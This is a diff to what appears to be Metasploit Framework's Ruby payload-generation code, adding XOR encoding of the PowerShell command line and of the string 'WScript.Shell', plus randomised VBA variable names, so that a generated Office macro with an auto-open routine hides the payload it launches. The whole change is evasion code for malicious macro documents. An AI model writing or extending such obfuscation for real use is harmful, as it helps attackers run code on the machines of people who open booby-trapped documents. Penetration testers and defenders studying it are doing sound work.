@@ -1015,15 +1015,36 @@ require 'msf/core/exe/segment_appender'
                     remove_comspec: true,
                     method: 'reflection')
 
+    powershell_pieces = powershell.split
+    powershell_cmd_line = powershell_pieces.slice(0,5).join(" ")
+
+    payload = powershell_pieces.last
+    xor_key = Rex::Text.rand_text_alpha(rand(8)+8)
+    xor_powershell_cmd = Rex::Encoding::Xor::Generic.encode(powershell_cmd_line,xor_key).first.strip
+    xor_powershell_vbs = Rex::Text.to_vbscript(xor_powershell_cmd)
+
+    xor_wscript_shell = Rex::Encoding::Xor::Generic.encode("WScript.Shell",xor_key).first.strip
+    xor_wscript_vbs = Rex::Text.to_vbscript(xor_wscript_shell)
+
     # Intialize rig and value names
     rig = Rex::RandomIdentifierGenerator.new()
     rig.init_var(:sub_auto_open)
     rig.init_var(:var_powershell)
+    rig.init_var(:function_xor)
+    rig.init_var(:var_data)
+    rig.init_var(:var_key)
+    rig.init_var(:var_i)
+    rig.init_var(:var_j)
+    rig.init_var(:var_place)
+    rig.init_var(:var_shell)
 
     hash_sub = rig.to_h
+    hash_sub[:xor_key] = xor_key
+    hash_sub[:xor_data] = xor_powershell_vbs.split("=").last
+    hash_sub[:xor_wscript_shell] = xor_wscript_vbs.split("=").last
     # VBA has a maximum of 24 line continuations
-    line_length = powershell.length / 24
-    vba_psh = '"' << powershell.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'
+    line_length = payload.length / 24
+    vba_psh = '"' << payload.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'
 
     hash_sub[:powershell] = vba_psh
 
